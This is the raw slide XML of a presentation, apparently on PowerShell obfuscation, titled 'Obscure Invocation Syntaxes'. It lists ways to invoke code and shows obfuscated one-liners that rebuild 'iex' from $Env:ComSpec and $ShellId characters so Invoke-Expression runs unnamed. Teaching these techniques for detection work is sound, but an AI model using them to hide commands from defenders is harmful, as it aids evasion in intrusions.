          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.((LS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Co*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[1]+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[13]+'x')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>&amp;( (GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -V)[1]+(DIR Variable:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[13]+'x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>???</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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6468" y="1643135"/>
            <a:ext cx="3620678" cy="4420391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455634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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5172087" y="3171266"/>
            <a:ext cx="254448" cy="2782406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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="449311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13975" y="3816757"/>
            <a:ext cx="6274050" cy="2246769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env:ComSpec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.((LS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Co*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[1]+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[13]+'x')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>&amp;( (GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -V)[1]+(DIR Variable:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[13]+'x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>''.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IndexOf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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103" y="1316310"/>
            <a:ext cx="5715689" cy="1951912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867523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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5172087" y="3171266"/>
            <a:ext cx="254448" cy="2782406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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="449311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13975" y="3816757"/>
            <a:ext cx="6274050" cy="2246769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env:ComSpec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.((LS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Co*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[1]+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[13]+'x')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>&amp;( (GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -V)[1]+(DIR Variable:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[13]+'x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[String]''.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IndexOf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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103" y="1316310"/>
            <a:ext cx="5715689" cy="1951912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103" y="3309083"/>
            <a:ext cx="5739157" cy="1735448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0197680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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
